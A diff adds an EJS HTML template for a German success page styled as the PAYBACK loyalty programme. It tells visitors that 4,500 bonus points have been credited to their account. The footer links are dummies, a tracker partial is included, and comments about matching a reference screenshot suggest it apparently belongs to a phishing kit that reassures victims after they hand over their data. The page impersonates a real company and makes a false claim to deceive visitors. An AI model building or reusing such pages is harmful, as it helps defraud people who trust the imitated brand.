@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <title></title>
+    <%- include('partials/tracker') %>
+        <style>
+            :root {
+                --bg-color: #FFFFFF;
+                --text-dark: #222222;
+                --divider-grey: #C6C7CA;
+                --font-stack: Arial, "Helvetica Neue", Helvetica, sans-serif;
+            }
+
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            html,
+            body {
+                width: 100%;
+                min-height: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: flex-start;
+                background-color: var(--bg-color) !important;
+                background: var(--bg-color) !important;
+                background-image: none !important;
+                color: var(--text-dark);
+                font-family: var(--font-stack);
+                text-align: center;
+                direction: ltr;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+
+            body::before,
+            body::after {
+                display: none !important;
+                content: none !important;
+                background: none !important;
+            }
+
+            /* =========================================================
+           PAGE WRAPPER (Flex column for sticky footer)
+           ========================================================= */
+            .page-container {
+                width: 100%;
+                max-width: 1200px;
+                min-height: 100vh;
+                min-height: 100dvh;
+                margin-left: auto !important;
+                margin-right: auto !important;
+                margin-top: 0;
+                margin-bottom: 0;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: space-between;
+                padding-top: 16px;
+                box-sizing: border-box;
+                background-color: var(--bg-color);
+                text-align: center;
+            }
+
+            /* Top Header Logo (public/img/bota.png) */
+            .top-header-logo {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                flex-shrink: 0;
+                margin: 0 auto;
+                text-align: center;
+            }
+
+            .top-header-logo img {
+                width: 120px;
+                height: auto;
+                display: block;
+                margin: 0 auto;
+            }
+
+            /* =========================================================
+           MAIN CONTENT AREA: Fills vertical space, pushes footer down
+           ========================================================= */
+            .main-content-area {
+                flex: 1 0 auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                padding: 20px 16px;
+                box-sizing: border-box;
+                margin: 0 auto;
+            }
+
+            /* Redesigned Success Section (No box, clean, matching reference screenshot) */
+            .success-section {
+                width: 100%;
+                max-width: 700px;
+                margin: 60px auto 40px auto;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                box-sizing: border-box;
+                padding: 0 16px;
+            }
+
+            /* Success Icon Circle: soft green background (#e8f5e9) with green ring (#4caf50) */
+            .check-icon {
+                width: 100px;
+                height: 100px;
+                background-color: #e8f5e9;
+                border: 3.5px solid #4caf50;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin: 0 auto 26px auto;
+                box-sizing: border-box;
+                animation: scaleIn 0.5s ease-out;
+                flex-shrink: 0;
+            }
+
+            .check-icon svg {
+                width: 50px;
+                height: 50px;
+                display: block;
+            }
+
+            @keyframes scaleIn {
+                0% {
+                    transform: scale(0);
+                }
+
+                80% {
+                    transform: scale(1.1);
+                }
+
+                100% {
+                    transform: scale(1);
+                }
+            }
+
+            /* Success Title: Bold, dark #191919, perfectly centered */
+            .success-title {
+                font-size: 38px;
+                font-weight: 700;
+                color: #191919;
+                margin: 0 0 16px 0;
+                line-height: 1.25;
+                letter-spacing: -0.3px;
+                text-align: center;
+                width: 100%;
+            }
+
+            /* Success Message: #595959, matching screenshot font size and spacing */
+            .success-message {
+                font-size: 17px;
+                line-height: 1.5;
+                color: #595959;
+                margin: 0 auto;
+                max-width: 600px;
+                text-align: center;
+                font-weight: 400;
+                width: 100%;
+            }
+
+            /* =========================================================
+           STICKY FOOTER (margin-top: auto anchors to viewport bottom)
+           ========================================================= */
+            .footer-wrapper {
+                margin-top: auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                flex-shrink: 0;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: center;
+            }
+
+            .divider-line {
+                width: 685px;
+                max-width: 92vw;
+                border-top: 1px solid var(--divider-grey);
+                margin-top: 36px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            .page-footer-nav {
+                width: 100%;
+                max-width: 920px;
+                margin-top: 32px;
+                margin-bottom: 36px;
+                padding: 0 16px;
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                align-items: center;
+                gap: 12px 20px;
+                box-sizing: border-box;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: center;
+            }
+
+            .footer-nav-link,
+            .footer-nav-link:link,
+            .footer-nav-link:visited {
+                font-size: 13.5px;
+                font-weight: 700;
+                color: var(--text-dark);
+                text-decoration: none;
+                white-space: nowrap;
+            }
+
+            .footer-nav-link:hover {
+                text-decoration: underline;
+            }
+
+            /* =========================================================
+           RESPONSIVE - TABLETS & MOBILE
+           ========================================================= */
+            @media (max-width: 720px) {
+                .success-section {
+                    margin: clamp(32px, 6vh, 60px) auto 30px auto;
+                }
+
+                .check-icon {
+                    width: 88px;
+                    height: 88px;
+                    border-width: 3px;
+                    margin-bottom: 24px;
+                }
+
+                .check-icon svg {
+                    width: 44px;
+                    height: 44px;
+                }
+
+                .success-title {
+                    font-size: 30px;
+                    margin-bottom: 12px;
+                }
+
+                .success-message {
+                    font-size: 15.5px;
+                }
+
+                .page-footer-nav {
+                    gap: 12px 18px;
+                }
+
+                .footer-nav-link,
+                .footer-nav-link:link,
+                .footer-nav-link:visited {
+                    font-size: 12.5px;
+                    font-weight: 700;
+                }
+            }
+
+            @media (max-width: 480px) {
+                .check-icon {
+                    width: 78px;
+                    height: 78px;
+                    border-width: 3px;
+                    margin-bottom: 20px;
+                }
+
+                .check-icon svg {
+                    width: 39px;
+                    height: 39px;
+                }
+
+                .success-title {
+                    font-size: 26px;
+                }
+
+                .success-message {
+                    font-size: 14.5px;
+                }
+            }
+        </style>
+</head>
+
+<body>
+    <div class="page-container">
+        <!-- Top Header Logo (public/img/bota.png) -->
+        <header class="top-header-logo">
+            <img src="/img/bota.png" alt="Logo"
+                onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/bota.png';}">
+        </header>
+
+        <!-- Main Content Area: flex: 1; pushes footer to bottom -->
+        <main class="main-content-area">
+            <div class="success-section">
+                <!-- Checkmark matching the reference screenshot -->
+                <div class="check-icon">
+                    <svg viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M13 26L21 34L37 15" stroke="#4caf50" stroke-width="4.5" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                    </svg>
+                </div>
+
+                <!-- Success Heading & Message matching the screenshot -->
+                <h1 class="success-title">4.500 Extra°P</h1>
+                <p class="success-message">
+                    Ausgezeichnet! Sie können nun von den 4.500 Extra°P profitieren, die Ihrem Payback-Konto hinzugefügt
+                    wurden. Die Punkte stehen Ihnen in 1–2 Werktagen zur Verfügung.
+                </p>
+            </div>
+        </main>
+
+        <!-- Sticky Footer Wrapper (Identical to index.ejs) -->
+        <div class="footer-wrapper">
+            <!-- Divider Line -->
+            <div class="divider-line"></div>
+
+            <!-- Footer Navigation Links -->
+            <footer class="page-footer-nav">
+                <a href="#" class="footer-nav-link">Impressum</a>
+                <a href="#" class="footer-nav-link">Unternehmen</a>
+                <a href="#" class="footer-nav-link">Arbeiten bei PAYBACK</a>
+                <a href="#" class="footer-nav-link">Fragen &amp; Hilfe</a>
+                <a href="#" class="footer-nav-link">Datenschutz</a>
+                <a href="#" class="footer-nav-link">Barrierefreiheit</a>
+                <a href="#" class="footer-nav-link">Cookie-Einstellungen</a>
+            </footer>
+        </div>
+    </div>
+</body>
+
+</html>
